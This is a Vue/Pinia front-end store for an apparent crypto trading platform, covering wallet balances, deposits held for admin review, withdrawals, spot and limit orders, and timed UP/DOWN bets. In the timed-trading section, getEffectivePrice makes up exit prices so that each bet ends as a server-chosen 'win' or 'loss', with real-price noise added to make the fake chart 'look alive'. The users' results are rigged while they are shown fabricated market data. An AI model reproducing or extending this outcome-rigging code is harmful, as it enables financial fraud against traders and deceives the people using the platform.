import { defineStore } from 'pinia';
import { ref, reactive, watch } from 'vue';
import { useMarketStore } from './market';
import { useAuthStore } from './auth';

import axios from '../api/axios';

export const useWalletStore = defineStore('wallet', () => {
    const marketStore = useMarketStore();

    // State
    const wallet = reactive({
        usdt: 0.00,
        btc: 0.00,
        eth: 0.00,
        sol: 0.00,
        bnb: 0.00,
        xrp: 0.00
    });

    const orderHistory = ref([]);

    // PnL Stats
    const stats = reactive({
        wins: 0,
        losses: 0,
        netProfit: 0
    });

    // Actions
    // Actions
    async function fetchBalance() {
        try {
            const response = await axios.get('/wallet');
            wallet.usdt = response.data.balance;

            // Update Assets
            const assets = response.data.assets || {};
            for (const [key, value] of Object.entries(assets)) {
                wallet[key] = value;
            }

            // Ensure defaults if not in DB yet
            if (wallet.btc === undefined) wallet.btc = 0;
            if (wallet.eth === undefined) wallet.eth = 0;

        } catch (error) {
            console.error('Failed to fetch balance:', error);
        }
    }

    async function navigateTo(route) {
        // Helper if needed
    }

    async function deposit(formData) {
        try {
            const response = await axios.post('/wallet/deposit', formData, {
                headers: { 'Content-Type': 'multipart/form-data' }
            });
            // Deposit is now PENDING — balance not credited yet, no wallet obj in response
            return { success: true, msg: response.data.msg || 'Deposit request submitted. It will be reviewed by our admin.' };
        } catch (error) {
            return { success: false, msg: error.response?.data?.error || 'Deposit failed' };
        }
    }

    async function withdraw(amount, targetAddress) {
        try {
            const response = await axios.post('/wallet/withdraw', { amount: parseFloat(amount), targetAddress });
            wallet.usdt = response.data.wallet.balance;
            return { success: true, msg: 'Withdrawal submitted successfully' };
        } catch (error) {
            return { success: false, msg: error.response?.data?.error || 'Withdrawal failed' };
        }
    }

    async function executeTrade(type, amount, totalUSDT) {
        let success = false;
        let msg = '';

        const coinSymbol = marketStore.activeCoin.symbol;

        try {
            const response = await axios.post('/trade', {
                type: type, // 'buy' or 'sell'
                coinSymbol: coinSymbol,
                amount: parseFloat(amount),
                price: marketStore.currentPrice,
                total: parseFloat(totalUSDT)
            });

            if (response.data.success) {
                // Update Local State from Response
                const newWallet = response.data.wallet;
                wallet.usdt = newWallet.balance;
                const assets = newWallet.assets || {};
                for (const [key, value] of Object.entries(assets)) {
                    wallet[key] = value;
                }

                success = true;
                msg = `Successfully ${type.toUpperCase()} ${amount} ${coinSymbol}`;

                marketStore.showToast('Order Filled', msg, 'success');
                marketStore.playSound('win');

                // Add to History (Hybrid: Backend saves it, but we show local for immediate feedback or fetch from backend)
                // For now, let's keep adding to local array for animation, but we should ideally fetch real history.
                orderHistory.value.unshift({
                    id: response.data.transaction.id,
                    time: new Date().toLocaleTimeString(),
                    pair: `${coinSymbol}/USDT`,
                    type: type.toUpperCase(),
                    price: marketStore.currentPrice,
                    amount: parseFloat(amount),
                    total: totalUSDT,
                    status: 'Filled'
                });

            } else {
                msg = response.data.error || 'Trade Failed';
                marketStore.showToast('Order Failed', msg, 'error');
            }
        } catch (error) {
            console.error('Trade Error:', error);
            msg = error.response?.data?.error || 'Network Error';
            marketStore.showToast('Order Failed', msg, 'error');
        }

        return { success, msg };
    }

    // --- TIMED TRADING LOGIC ---
    const activePositions = ref([]);
    const activeLimitOrders = ref([]); // Limit Orders State

    async function openPosition(type, amount, durationSeconds, percentage) {
        if (wallet.usdt < amount) {
            marketStore.showToast('Insufficent Balance', 'Not enough USDT', 'error');
            return { success: false, msg: 'Insufficient Balance' };
        }

        try {
            const response = await axios.post('/trade/open', {
                type,
                amount,
                durationSeconds,
                pair: `${marketStore.activeCoin.symbol}/USDT`
            });

            if (response.data.success) {
                wallet.usdt = response.data.wallet.balance;

                const position = {
                    id: Date.now(),
                    transactionId: response.data.transactionId,
                    pair: `${marketStore.activeCoin.symbol}/USDT`,
                    entryPrice: marketStore.currentPrice,
                    amount: parseFloat(amount),
                    type: type, // 'UP' or 'DOWN'
                    duration: durationSeconds,
                    percentage: percentage || 80,
                    startTime: Date.now(),
                    endTime: Date.now() + (durationSeconds * 1000),
                    status: 'OPEN',
                    _mode: response.data.profitMode || 'random'
                };

                activePositions.value.push(position);
                marketStore.showToast('Position Opened', `${type} for ${durationSeconds}s`, 'success');
                marketStore.playSound('open');

                // Return the reactive proxy from the array, not the raw object
                const reactivePosition = activePositions.value[activePositions.value.length - 1];
                return { success: true, msg: 'Position Opened', position: reactivePosition };
            }
        } catch (error) {
            const msg = error.response?.data?.error || 'Failed to Open Position';
            marketStore.showToast('Failed to Open', msg, 'error');
            return { success: false, msg };
        }
    }

    // Check for expired positions every second
    setInterval(() => {
        const now = Date.now();
        // Create a safe copy of indices to prevent array mutation bugs during loop
        const toSettle = [];
        activePositions.value.forEach((pos, index) => {
            if (pos.status === 'OPEN' && now >= pos.endTime) {
                pos.status = 'SETTLING'; // Prevent multiple settlement calls
                toSettle.push(index);
            }
        });

        toSettle.forEach(idx => settlePosition(idx));
    }, 1000);

    // New Action: Fetch Stats
    async function fetchStats() {
        try {
            const response = await axios.get('/trade/stats');
            if (response.data) {
                stats.wins = response.data.wins;
                stats.losses = response.data.losses;
                stats.netProfit = response.data.netProfit || 0;
            }
        } catch (error) {
            console.error('Failed to fetch stats:', error);
        }
    }

    function getEffectivePrice(position, realMarketPrice) {
        if (!position || position._mode === 'random') {
            return realMarketPrice;
        }

        const entryPrice = parseFloat(position.entryPrice);
        const isUpBet = position.type === 'UP';
        const shouldWin = position._mode === 'win';

        // Extract the sub-cent volatility from the real market price to make it look alive
        // Real price: 65000.1234 -> 0.1234
        // We use Math.abs to ensure we don't accidentally flip the sign
        const volatilityBase = Math.abs(parseFloat(realMarketPrice)) || 0;
        // Keep the noise very subtle, e.g. based on the last 3 digits
        const noise = (volatilityBase % 1) * 0.0001 * entryPrice;

        // Generate a fake price that guarantees the right outcome
        // We use 0.2% baseline movement plus the real market noise
        if (shouldWin) {
            if (isUpBet) return (entryPrice * 1.002) + noise;
            else return (entryPrice * 0.998) - noise;
        } else {
            if (isUpBet) return (entryPrice * 0.998) - noise;
            else return (entryPrice * 1.002) + noise;
        }
    }

    async function settlePosition(index) {
        const pos = activePositions.value[index];
        if (!pos) return;
        const realPrice = marketStore.currentPrice;
        const effectivePrice = getEffectivePrice(pos, realPrice);

        // Local guess (used only as initial hint to backend, backend overrides)
        let localGuess = 'loss';
        if (pos.type === 'UP' && effectivePrice > pos.entryPrice) localGuess = 'win';
        if (pos.type === 'DOWN' && effectivePrice < pos.entryPrice) localGuess = 'win';

        // Call Backend — backend has the REAL profitMode from DB
        let isWin = false;
        let profit = 0;
        let loss = 0;

        try {
            const response = await axios.post('/trade/settle', {
                transactionId: pos.transactionId,
                result: localGuess,
                amount: pos.amount,
                profit: 0,
                loss: 0,
                pair: pos.pair,
                durationSeconds: pos.duration
            });

            if (response.data.success) {
                wallet.usdt = response.data.wallet.balance;

                // Use backend's authoritative result
                const serverResult = response.data.finalResult;
                isWin = serverResult === 'win';
                profit = response.data.actualProfit || 0;
                loss = response.data.actualLoss || 0;
            }
        } catch (error) {
            console.error('Settlement Sync Failed:', error);
            // Fallback to local guess
            isWin = localGuess === 'win';
            const pctAmount = pos.amount * ((pos.percentage || 80) / 100);
            profit = isWin ? pctAmount : 0;
            loss = isWin ? 0 : pctAmount;
        }

        // Fetch latest stats after EVERY settlement so profile numbers update
        await fetchStats();

        if (isWin) {
            stats.wins++;
            stats.netProfit += profit;
            marketStore.showToast('Trade WON!', `Profit: $${profit.toFixed(2)}`, 'success');
            marketStore.playSound('win');
        } else {
            stats.losses++;
            stats.netProfit -= loss;
            marketStore.showToast('Trade LOST', `Loss: -$${loss.toFixed(2)}`, 'error');
            marketStore.playSound('loss');
        }

        // Move to History
        orderHistory.value.unshift({
            ...pos,
            exitPrice: effectivePrice,
            profit: isWin ? profit : -loss,
            status: isWin ? 'WIN' : 'LOSS',
            time: new Date().toLocaleTimeString()
        });

        // Update position status so UI (countdown popup) can detect it
        pos.status = isWin ? 'WIN' : 'LOSS';

        // Delay removal so countdown popup can react to status change
        setTimeout(() => {
            const idx = activePositions.value.findIndex(p => p.id === pos.id);
            if (idx !== -1) activePositions.value.splice(idx, 1);
        }, 2000);
    }

    // --- LIMIT ORDER LOGIC ---
    function placeLimitOrder(type, price, amount, totalUSDT) {
        // Validate Balance
        if (type === 'buy') {
            if (wallet.usdt < totalUSDT) {
                marketStore.showToast('Insufficient Balance', 'Not enough USDT', 'error');
                return { success: false, msg: 'Insufficient USDT' };
            }
            wallet.usdt -= totalUSDT; // Lock funds
        } else {
            const coinKey = marketStore.activeCoin.symbol.toLowerCase();
            if ((wallet[coinKey] || 0) < amount) {
                marketStore.showToast('Insufficient Balance', `Not enough ${marketStore.activeCoin.symbol}`, 'error');
                return { success: false, msg: 'Insufficient Coin Balance' };
            }
            wallet[coinKey] -= amount; // Lock funds
        }

        activeLimitOrders.value.push({
            id: Date.now(),
            time: new Date().toLocaleTimeString(),
            pair: `${marketStore.activeCoin.symbol}/USDT`,
            type: type.toUpperCase(),
            limitPrice: parseFloat(price),
            amount: parseFloat(amount),
            total: totalUSDT,
            status: 'OPEN'
        });

        marketStore.showToast('Limit Order Placed', `${type} @ ${price}`, 'success');
        return { success: true, msg: 'Limit Order Placed' };
    }

    function cancelLimitOrder(id) {
        const index = activeLimitOrders.value.findIndex(o => o.id === id);
        if (index === -1) return;

        const order = activeLimitOrders.value[index];

        // Refund locked funds
        if (order.type === 'BUY') {
            wallet.usdt += order.total;
        } else {
            const symbol = order.pair.split('/')[0].toLowerCase();
            if (!wallet[symbol]) wallet[symbol] = 0;
            wallet[symbol] += order.amount;
        }

        activeLimitOrders.value.splice(index, 1);
        marketStore.showToast('Order Canceled', 'Funds returned', 'info');
    }

    // Watch Price for Limit Execution
    watch(() => marketStore.currentPrice, (newPrice) => {
        if (activeLimitOrders.value.length === 0) return;

        activeLimitOrders.value.forEach((order, index) => {
            let triggered = false;

            // Buy Limit: Price drops <= limit
            if (order.type === 'BUY' && newPrice <= order.limitPrice) triggered = true;

            // Sell Limit: Price rises >= limit
            if (order.type === 'SELL' && newPrice >= order.limitPrice) triggered = true;

            if (triggered) {
                // Execute Trade
                if (order.type === 'BUY') {
                    // Funds already locked in USDT, swap to Coin
                    const coinKey = order.pair.split('/')[0].toLowerCase();
                    if (!wallet[coinKey]) wallet[coinKey] = 0;
                    wallet[coinKey] += order.amount;
                } else {
                    // Funds already locked in Coin, swap to USDT
                    wallet.usdt += order.total;
                }

                // Add to History
                orderHistory.value.unshift({
                    ...order,
                    price: newPrice, // Executed at market price (or limit price depending on rule, usually best available)
                    status: 'Filled',
                    time: new Date().toLocaleTimeString()
                });

                marketStore.showToast('Limit Order Filled', `${order.type} ${order.pair} @ ${newPrice}`, 'success');
                marketStore.playSound('win'); // Use win sound for fill

                // Remove from active
                activeLimitOrders.value.splice(index, 1);
            }
        });
    });

    return {
        wallet,
        orderHistory,
        stats,
        activePositions,
        activeLimitOrders,
        fetchBalance,
        executeTrade,
        openPosition,
        deposit,
        withdraw,
        placeLimitOrder,
        cancelLimitOrder,
        fetchStats,
        getEffectivePrice
    };
}, {
    persist: true
});
